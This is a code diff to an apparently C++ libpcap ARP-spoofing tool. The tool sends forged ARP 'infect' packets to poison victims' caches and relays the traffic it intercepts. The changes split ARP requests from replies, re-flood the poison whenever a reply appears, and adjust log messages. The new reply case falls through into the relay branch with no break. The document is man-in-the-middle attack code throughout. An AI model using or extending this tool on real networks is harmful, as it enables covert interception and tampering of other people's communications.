@@ -9,7 +9,8 @@
 #include "arphdr.h"
 #include<time.h>
 #define RELAY 1
-#define INFECT 2
+#define INFECT_REPLY 2
+#define INFECT_REQUEST 3
 #define MAX_AGENTS 40
 #define MAX_PACKET_SIZE 1514
 #pragma pack(push, 1)
@@ -136,6 +137,7 @@ void Relay(pcap_t* handle, const u_char* packet, Mac mmac, int size){
 }
 //send infect pacet to all pairs
 void SendInfectFlood(pcap_t* handle){
+	printf("[info]spreading arp...\n");
 	for(int i=0; i<idx; i++){
 		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
 			if (res != 0) {
@@ -147,7 +149,7 @@ void SendInfectFlood(pcap_t* handle){
 void SendInfect(pcap_t* handle, Ip sip){
 	for(int i=0; i<idx; i++){
 		if((uint32_t)spoofarr[i].sip_==ntohl(sip)){
-			printf("send arp\n");
+			printf("[info]re-send arp..\n");
 			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&spoofarr[i].infctpckt), sizeof(EthArpPacket));
 			if (res != 0) {
 				fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
@@ -161,7 +163,11 @@ int parsing(const u_char* packet, Ip mip){
 	EthHdr* ethhdr=(EthHdr*)packet;
 	if(ntohs(ethhdr->type_)==EthHdr::Arp){
 		ArpHdr* arphdr=(ArpHdr*)(packet+ETHHDRSIZE);
-		return INFECT;
+		if(arphdr->op()==ArpHdr::Reply){
+			return INFECT_REPLY;
+		}
+		else
+			return INFECT_REQUEST;
 	}
 	else {
 		IpHdr* iphdr=(IpHdr*)(packet+ETHHDRSIZE);
@@ -239,7 +245,6 @@ int main(int argc, char* argv[]) {
 	while(1){
 		clock_t end=clock();
 		if((end - start)>20000){//time to spread arp
-			printf("[info]spreading arp...\n");
 			SendInfectFlood(handle);
 			start=clock();
 		}
@@ -253,10 +258,12 @@ int main(int argc, char* argv[]) {
 		res=parsing(rawpacket, myip);
 		switch (res)
 		{
-		case INFECT:
+		case INFECT_REQUEST:
 			arppacket=(EthArpPacket*)rawpacket;
 			SendInfect(handle, arppacket->arp_.sip_);
 			break;
+		case INFECT_REPLY:
+			SendInfectFlood(handle);
 		case RELAY:
 			Relay(handle, rawpacket,mmac,header->len);
 		default:
